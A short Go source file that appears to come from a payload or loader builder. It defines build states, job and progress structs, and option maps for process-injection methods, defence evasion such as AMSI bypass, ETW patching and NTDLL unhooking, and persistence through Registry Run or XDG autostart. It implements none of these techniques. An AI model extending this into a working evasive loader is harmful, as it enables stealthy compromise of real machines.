package main

import "time"

// Build state machine
type BuildState int

const (
	BuildIdle BuildState = iota
	BuildRunning
	BuildCancelling
)

func (s BuildState) String() string {
	return []string{"Idle", "Running", "Cancelling"}[s]
}

// Platform flags for conditional options
const (
	PlatWin = 1 << 0
	PlatLin = 1 << 1
	PlatAll = PlatWin | PlatLin
)

// BuildJob represents a single build request
type BuildJob struct {
	Targets    []string      // ["linux", "windows"]
	Asset      string        // selected asset path
	EmbedAsset bool          // true = embed, false = HTTP fetch
	PkgConfig  PackageConfig // snapshot from Package tab
	StartedAt  time.Time
}

// TargetProgress tracks per-target build status
type TargetProgress struct {
	Target string // "linux" or "windows"
	Phase  string // "compiling", "packaging", "encrypting", "done"
	Done   bool
	Error  string // empty if success
}

// Platform mappings for conditional options
var execMethodPlatform = map[int]int{
	0: PlatAll, // Raw Binary
	1: PlatWin, // Process Ghosting
	2: PlatWin, // Process Hollowing
	3: PlatWin, // Process Herpaderping
	4: PlatWin, // APC Injection
	5: PlatWin, // Thread Hijacking
	6: PlatWin, // Threadless Injection
	7: PlatWin, // Module Stomping
}

var evasionPlatform = map[int]int{
	0: PlatWin, // AMSI Bypass
	1: PlatWin, // ETW Patch
	2: PlatWin, // NTDLL Unhook
	3: PlatWin, // PPID Spoof
	4: PlatWin, // Block DLL Policy
	5: PlatWin, // Anti-Debug
	6: PlatWin, // Anti-Analysis
	7: PlatWin, // Direct Syscalls
}

var persistPlatform = map[int]int{
	0: PlatAll, // None
	1: PlatWin, // Registry Run
	2: PlatLin, // XDG Autostart
	3: PlatWin, // Self-Delete
}
